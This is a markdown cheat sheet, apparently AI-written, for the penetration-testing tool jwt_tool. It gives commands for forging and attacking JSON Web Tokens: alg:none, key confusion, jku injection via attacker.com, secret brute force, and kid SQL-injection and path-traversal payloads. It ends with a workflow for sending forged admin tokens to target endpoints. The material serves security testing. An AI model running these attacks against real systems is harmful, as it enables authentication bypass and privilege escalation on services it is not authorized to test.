# jwt_tool

**Tags:** `#jwt` `#jwt_tool` `#webappsec` `#authentication` `#web` `#tokenattacks`

Swiss army knife for testing JSON Web Tokens. Decodes, verifies, forges, and tests JWT vulnerabilities — algorithm confusion (alg:none, RS256→HS256), key brute forcing, injection attacks (kid SQLi/path traversal), claim tampering, and more. Used for auth bypass and privilege escalation in web applications using JWT-based auth.

**Source:** https://github.com/ticarpi/jwt_tool
**Install:** `pip install jwt_tool` or `git clone https://github.com/ticarpi/jwt_tool`

```bash
python3 jwt_tool.py <token>
```

> [!note]
> Get the JWT from the Authorization header (`Bearer <token>`) or from cookies/localStorage. Always decode first to understand the structure, then test attacks systematically. The `-t` scan mode runs all attacks automatically.

---

## Setup

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
python3 jwt_tool.py --help

# Or install via pip
pip install jwt_tool
jwt_tool <token>
```

---

## Decode & Inspect

```bash
# Decode token (no verification)
python3 jwt_tool.py eyJhbGc...

# Verbose decode
python3 jwt_tool.py eyJhbGc... -d

# Output shows:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"1234","name":"user","role":"user","iat":1516239022}
# Signature: [base64]
```

---

## Automated Scan (All Attacks)

```bash
# Run all tests against endpoint
python3 jwt_tool.py <token> -t http://target.com/api/profile \
  -rh "Authorization: Bearer JWT_HERE" -M at

# -M at = all tests
# -rh = request header (replace JWT_HERE with actual token placeholder)
```

---

## Algorithm Attacks

```bash
# alg:none — strip signature, change alg to none
python3 jwt_tool.py <token> -X a

# RS256 → HS256 confusion (sign with public key as HMAC secret)
# First get the public key (from /jwks.json, /.well-known/jwks.json, or certs)
python3 jwt_tool.py <token> -X k -pk public_key.pem

# Embedded JWK (inject your own public key)
python3 jwt_tool.py <token> -X j

# jku header injection (point to your JWKS)
python3 jwt_tool.py <token> -X u -ju "http://attacker.com/jwks.json"

# x5u header injection
python3 jwt_tool.py <token> -X u -x5u "http://attacker.com/cert.pem"
```

---

## Claim Tampering

```bash
# Modify a claim value (requires known/cracked secret)
python3 jwt_tool.py <token> -I -pc role -pv admin

# Modify multiple claims
python3 jwt_tool.py <token> -I -pc role -pv admin -pc sub -pv 1

# -I = inject / tamper
# -pc = payload claim name
# -pv = payload claim value

# Sign with known secret after tampering
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p "secretkey"
```

---

## Brute Force Secret

```bash
# Brute force HMAC secret with wordlist
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try manually
python3 jwt_tool.py <token> -C -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# If secret found — sign forged token
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p "found_secret"
```

---

## kid Injection

```bash
# kid = Key ID header — used to look up signing key
# If kid is passed to SQL query or file read, inject there

# SQLi in kid (sign with empty string as key)
python3 jwt_tool.py <token> -I -hc kid -hv "' UNION SELECT 'secretkey'-- -" \
  -S hs256 -p "secretkey"

# Path traversal in kid (use /dev/null → sign with empty key)
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# -hc = header claim name
# -hv = header claim value
```

---

## Send Forged Token to Target

```bash
# Test against endpoint
python3 jwt_tool.py <token> -t http://target.com/api/admin \
  -rh "Authorization: Bearer JWT_HERE" \
  -X a   # alg:none attack

# POST request with forged token
python3 jwt_tool.py <token> -t http://target.com/api/action \
  -rh "Authorization: Bearer JWT_HERE" \
  -rd '{"action":"delete"}' \
  -rm POST \
  -X a

# -rh = request header
# -rd = request data (body)
# -rm = request method
```

---

## Common JWT Attack Workflow

```bash
# 1. Extract token from browser (DevTools → Network → Authorization header)
TOKEN="eyJhbGc..."

# 2. Decode and inspect claims
python3 jwt_tool.py $TOKEN

# 3. Try alg:none
python3 jwt_tool.py $TOKEN -X a

# 4. Try HMAC brute force
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# 5. If secret found — tamper role/admin claim
python3 jwt_tool.py $TOKEN -I -pc role -pv admin -S hs256 -p "FOUND_SECRET"

# 6. If RSA key available — try RS256→HS256
python3 jwt_tool.py $TOKEN -X k -pk server_public.pem

# 7. Test forged token
curl http://target.com/api/admin -H "Authorization: Bearer FORGED_TOKEN"
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `-d` | Verbose decode |
| `-X a` | alg:none attack |
| `-X k` | RS256→HS256 key confusion |
| `-X j` | Embedded JWK attack |
| `-X u` | jku/x5u URL injection |
| `-I` | Inject / tamper claims |
| `-hc` | Header claim name |
| `-hv` | Header claim value |
| `-pc` | Payload claim name |
| `-pv` | Payload claim value |
| `-S hs256` | Sign with algorithm |
| `-p` | Signing secret/key |
| `-C` | Crack / brute force |
| `-d` | Dictionary for brute force |
| `-pk` | Public key file (PEM) |
| `-t` | Target URL to test |
| `-rh` | Request header |
| `-rd` | Request data (body) |
| `-rm` | Request method |
| `-M at` | Run all tests |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
